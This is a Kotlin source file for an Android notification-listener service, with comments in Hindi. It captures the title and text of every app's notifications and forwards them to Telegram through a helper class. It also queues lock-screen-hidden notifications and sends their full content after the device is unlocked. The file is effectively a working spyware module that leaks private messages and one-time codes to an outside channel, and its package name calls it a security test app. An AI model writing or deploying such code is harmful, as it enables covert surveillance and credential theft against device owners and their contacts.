package com.security.testapp

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.util.Collections
import java.util.LinkedHashSet

class NotificationListener : NotificationListenerService() {

    companion object {
        var instance: NotificationListener? = null
            private set
    }

    // छुपी हुई नोटिफिकेशन की keys (अनलॉक होने पर भेजने के लिए)
    private val hiddenKeys = Collections.synchronizedSet(LinkedHashSet<String>())
    // डुप्लिकेट रोकने के लिए
    private val recentKeys = LinkedHashSet<String>(50)

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        synchronized(recentKeys) {
            if (recentKeys.contains(sbn.key)) return
            recentKeys.add(sbn.key)
            if (recentKeys.size > 50) {
                val it = recentKeys.iterator()
                it.next()
                it.remove()
            }
        }

        val packageName = sbn.packageName
        val notification = sbn.notification

        // पहले publicVersion से कोशिश करें
        val usePublic = notification.visibility == Notification.VISIBILITY_PRIVATE
        val extras = if (usePublic && notification.publicVersion != null) {
            notification.publicVersion.extras
        } else {
            notification.extras
        }

        val title = extras?.getString("android.title") ?: ""
        val text = extras?.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras?.getCharSequence("android.bigText")?.toString() ?: ""
        val subText = extras?.getCharSequence("android.subText")?.toString() ?: ""
        val summaryText = extras?.getCharSequence("android.summaryText")?.toString() ?: ""
        val ticker = notification.tickerText?.toString() ?: ""

        var finalText = if (bigText.isNotEmpty()) bigText else text
        if (finalText.isEmpty()) finalText = if (subText.isNotEmpty()) subText else summaryText
        if (finalText.isEmpty()) finalText = ticker

        if (finalText.isEmpty()) {
            // सारी कोशिशों के बाद भी खाली — अभी न भेजें, अनलॉक का इंतज़ार करें
            hiddenKeys.add(sbn.key)
            return
        }

        val message = "🔔 Notification [$packageName]\nTitle: $title\nText: $finalText"
        TelegramHelper.sendWithFallback(message, this)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // जब नोटिफिकेशन हटे, तो hiddenKeys से भी निकालें ताकि अनलॉक पर गायब को न भेजें
        if (sbn != null) hiddenKeys.remove(sbn.key)
    }

    /** अनलॉक होने पर UnlockReceiver से बुलाया जाएगा */
    fun onUnlock() {
        val active = activeNotifications ?: return
        for (sbn in active) {
            if (hiddenKeys.remove(sbn.key)) {
                // अब पूरा कंटेंट निकालें (डिवाइस अनलॉक है तो सारी जानकारी मिलेगी)
                val packageName = sbn.packageName
                val extras = sbn.notification.extras
                val title = extras?.getString("android.title") ?: ""
                val text = extras?.getCharSequence("android.text")?.toString() ?: ""
                val bigText = extras?.getCharSequence("android.bigText")?.toString() ?: ""
                val subText = extras?.getCharSequence("android.subText")?.toString() ?: ""
                val summaryText = extras?.getCharSequence("android.summaryText")?.toString() ?: ""
                val ticker = sbn.notification.tickerText?.toString() ?: ""

                var finalText = if (bigText.isNotEmpty()) bigText else text
                if (finalText.isEmpty()) finalText = if (subText.isNotEmpty()) subText else summaryText
                if (finalText.isEmpty()) finalText = ticker

                // अगर फिर भी खाली (बहुत rare) तो "[Content Hidden]" बता दें
                if (finalText.isEmpty()) finalText = "[Content Hidden]"

                val message = "🔓 Unlocked Notification [$packageName]\nTitle: $title\nText: $finalText"
                TelegramHelper.sendWithFallback(message, this)
            }
        }
    }
}
